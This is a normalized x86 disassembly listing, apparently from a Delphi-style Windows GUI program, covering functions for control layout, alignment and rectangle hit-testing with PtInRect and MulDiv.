mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_43f0c0
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_43f1ac
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4033e4
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_43f1e0
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43f200
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403454
test al al
je r-xdata
mov eax edi
call sub_43f240
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_43f26c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_43f298
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_4069fc
mov eax esp
call sub_412b60
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43ca64
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403454
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403454
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_43ca90
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_412b60
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_412ae8
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_43ca38
sub_43f3c0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_43f400
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43bc64
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_43f434
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_43f52c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43c020
push ebx
push sub_440ec4
call sub_41aabc
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d43c
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41d5e4
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_40357c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ab30
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403ffc
lea eax [ ebx + 0x188 ]
call sub_403fa8
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f533
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
sub_43f533
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_43f558
push ebx
push esi
push edi
call sub_4035e4
mov ebx edx
mov edi eax
mov eax edi
call sub_419ccc
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4056c4
mov eax [ edi + 0x178 ]
call sub_403258
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43abcc
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_4401f8
mov eax edi
call sub_440438
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403258
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_4403fc
mov esi eax
mov edx esi
mov eax edi
call sub_440264
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_440438
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43c0f8
test bl bl
jle r-xdata
call sub_41ab54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035cc
sub_43f628
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_43f6ec
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4140e4
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_4438c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413f44
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_414038
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413f44
test eax eax
je r-xdata
sub_43f6fc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ffa0
xor eax eax
push ebp
push sub_43f73c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c35c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f743
mov eax [ ebp - 0x4 ]
call sub_43ffa8
retn
sub_43f743
mov eax [ ebp - 0x4 ]
call sub_43f628
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440dfc
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_43e0d4
sub_43f778
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_43f793 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_43f804
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443a0c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_412ae8
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43fb85
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fb8c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_43fa9a ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43f9fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_43fb8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_43fbbb ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_43fc44
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440438
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_413de8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_413f44
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_43f804
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4403fc
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_413fc0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_413f44
mov edx eax
mov ecx ebx
mov eax edi
call sub_43f778
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_43fdb4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_440438
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_4403fc
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_4403fc
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_43fe08
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_43fdb4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43fee7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_43fc44
pop ecx
push ebp
mov al 0x2
call sub_43fc44
pop ecx
push ebp
mov al 0x3
call sub_43fc44
pop ecx
push ebp
mov al 0x4
call sub_43fc44
pop ecx
push ebp
mov al 0x5
call sub_43fc44
pop ecx
push ebp
mov al 0x6
call sub_43fc44
pop ecx
push ebp
xor eax eax
call sub_43fc44
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403454
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_43ff0c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443a0c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43ffa0
xor eax eax
push ebp
push sub_43ff93
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43ffa8
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_43ffd0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_440095
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43c924
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_440438
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44009c
mov eax [ ebp - 0xc ]
call sub_403258
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4403fc
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413de8
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43c690
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413f44
xor ecx ecx
mov edx 0xb03e
call sub_43e0d4
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4403fc
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_4400a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440438
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
